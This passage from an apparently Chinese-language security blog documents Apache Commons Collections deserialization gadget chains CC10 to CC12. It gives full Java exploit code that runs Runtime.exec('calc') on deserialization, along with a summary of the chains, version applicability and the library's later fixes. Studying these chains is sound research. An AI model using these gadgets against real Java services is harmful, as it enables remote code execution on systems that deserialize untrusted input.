org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC10</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        Hashtable ht = <span class="hljs-keyword">new</span> Hashtable();<br>        ht.put(<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>);<br>        Field tableF = Hashtable.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] table =(Object[]) tableF.get(ht);<br>        Object entry = table[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(entry==<span class="hljs-keyword">null</span>)&#123;<br>            entry = table[<span class="hljs-number">1</span>];<br>        &#125;<br>        Field keyF = entry.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(entry,tiedMapEntry);<br>        Field iTransformers = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformers.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformers.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(ht);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections11"><a href="#CommonsCollections11" class="headerlink" title="CommonsCollections11"></a>CommonsCollections11</h2><h3 id="Pre-10"><a href="#Pre-10" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-10"><a href="#限制-10" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="关键类-10"><a href="#关键类-10" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ClassPool</span><br><span class="hljs-attribute">CtClass</span><br><span class="hljs-attribute">AbstractTranslet</span><br><span class="hljs-attribute">TemplatesImpl</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure><h4 id="利用链-10"><a href="#利用链-10" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h3 id="Gadget-10"><a href="#Gadget-10" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC11;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC11</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Cat&quot;</span> + System.nanoTime());<br>        ctc.setSuperclass(cp.getCtClass(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><br>        InvokerTransformer fakeinvokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;toString&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, fakeinvokerTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, templatesimpl);<br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        Field iMethodNameF = InvokerTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iMethodName&quot;</span>);<br>        iMethodNameF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iMethodNameF.set(fakeinvokerTransformer, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections12"><a href="#CommonsCollections12" class="headerlink" title="CommonsCollections12"></a>CommonsCollections12</h2><h3 id="Pre-11"><a href="#Pre-11" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-11"><a href="#限制-11" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="关键类-11"><a href="#关键类-11" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ScriptEngineManager</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br></code></pre></td></tr></table></figure><h4 id="利用链-11"><a href="#利用链-11" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                    ...</span><br><span class="hljs-operator">                    </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScriptEngineManager</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ScriptEngineManager</span>.</span></span>gey<span class="hljs-constructor">EngineByName()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NashornScriptEngine</span>.</span></span>eval<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">NashornScriptEngine</span>.</span></span>eval<span class="hljs-constructor">Impl()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h3 id="Gadget-11"><a href="#Gadget-11" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC12;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> javax.script.ScriptEngineManager;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC12</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(ScriptEngineManager.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newInstance&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getEngineByName&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;JavaScript&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><br>        HashSet hs = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<br>        hs.add(<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field mapF = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        mapF.setAccessible(<span class="hljs-keyword">true</span>);<br>        HashMap hm_tmp = (HashMap) mapF.get(hs);<br><br>        Field tableF = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>        tableF.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object[] arr = (Object[]) tableF.get(hm_tmp);<br><br>        Object node = arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-keyword">null</span>) &#123;<br>            node = arr[<span class="hljs-number">1</span>];<br>        &#125;<br><br>        Field keyF = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>        keyF.setAccessible(<span class="hljs-keyword">true</span>);<br>        keyF.set(node, tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(hs);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC-总结"><a href="#CC-总结" class="headerlink" title="CC 总结"></a>CC 总结</h2><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/f9bee6c5293b753f2421c47eb8cfb7e38.png"></p><p><code>CommonsCollections&lt;=3.2.1</code>下的反序列化利用链的总结：</p><ul><li>起始点<ol><li><code>AnnotationInvocationHandler</code>的<code>readObject</code></li><li><code>BadAttributeValueExpException</code>的<code>readObject</code></li><li><code>HashSet</code>的<code>readObject</code></li><li><code>Hashtable</code>的<code>readObject</code></li></ol></li><li>重要的承接点<ol><li><code>LazyMap</code>的<code>get</code></li><li><code>DefaultedMap</code>的<code>get</code></li><li><code>TiedMapEntry</code>的<code>getValue</code></li><li><code>Proxy</code>的<code>invoke</code></li></ol></li><li>终点<ol><li><code>ChainedTransformer</code>的<code>transform</code></li><li><code>InvokerTransformer</code>的<code>transform</code></li><li><code>ConstantTransformer</code>的<code>transform</code></li></ol></li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">各exp的<span class="hljs-keyword">jdk适用版本</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">jdk7 </span>&gt;= CommonsCollections <span class="hljs-number">1</span>、<span class="hljs-number">3</span><br><span class="hljs-keyword">jdk7 </span>&amp; <span class="hljs-keyword">jdk8 </span>&gt;= CommonsCollections <span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><br><br>各exp的commons-collections适用版本<br><br>commons-collections &lt;= <span class="hljs-number">3</span>.<span class="hljs-number">1</span> CommonsCollections <span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span><br>commons-collections &lt;= <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span> CommonsCollections <span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="版本更新"><a href="#版本更新" class="headerlink" title="版本更新"></a>版本更新</h3><p>Commons-Collections 4.0 和 Commons-Collections 3.2.1 是两个不同的分支</p><ul><li><p>commons-collections:commons-collections</p></li><li><p>org.apache.commons:commons-collections4</p></li></ul><p>Commons-Collections 4 是官方为了调整架构和 API 设计上的问题推出的项目，不能用来替换 Commons-Collections</p><p>对于 CC1 和 CC3，如果依赖是 Commons-Collections 4.0，<code>LazyMap.decorate</code>需要更换为<code>LazyMap.lazyMap</code></p><p>对于 Commons-Collections 3.2.2，<code>readObject</code>增加了<code>FunctorUtils.checkUnsafeSerialization</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/t01eee470f626eda79e.png"></p><p>UNSAFE_SERIALIZABLE_PROPERTY 的值默认为 false，如果需要为 true，需要在运行时指定</p><p>使用 InvokerTransformer 作为反序列化利用链的一部分时，会 throw 一个 exception</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">CloneTransformer</span><br><span class="hljs-keyword"></span>ForClosure<br><span class="hljs-keyword">InstantiateFactory</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">InstantiateTransformer</span><br><span class="hljs-keyword"></span>InvokerTransformer<br>PrototypeCloneFactory<br>PrototypeSerializationFactory<br>WhileClosure<br></code></pre></td></tr></table></figure><p>而 4.1 的修复方式，危险的<code>Transformer</code>不再实现<code>Serializable</code>接口</p><h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通 Java 类对 象（也称为 JavaBean）的一些操作方法。</p><h3 id="Pre-12"><a href="#Pre-12" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-12"><a href="#限制-12" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>commons-beanutils</p></blockquote><h4 id="利用链-12"><a href="#利用链-12" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 